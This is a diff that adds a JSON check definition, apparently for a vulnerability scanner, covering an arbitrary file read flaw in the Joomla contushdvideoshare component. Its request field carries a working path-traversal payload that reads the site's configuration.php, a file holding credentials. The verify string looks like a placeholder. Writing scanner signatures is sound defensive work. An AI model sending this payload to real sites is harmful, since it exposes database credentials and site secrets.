@@ -1,0 +1,23 @@
+{
+    "target":"joomla",
+    "meta":{
+        "name":    "Joomla contushdvideoshare 任意文件读取漏洞",
+        "remarks": "Joomla contushdvideoshare 存在任意文件读取漏洞",
+        "level":   1,
+        "type":    "任意文件读取漏洞",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0062"
+        }
+    },
+    "request":{
+        "path":     "/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "the joomla configuration.php contain the words"
+    }
+}
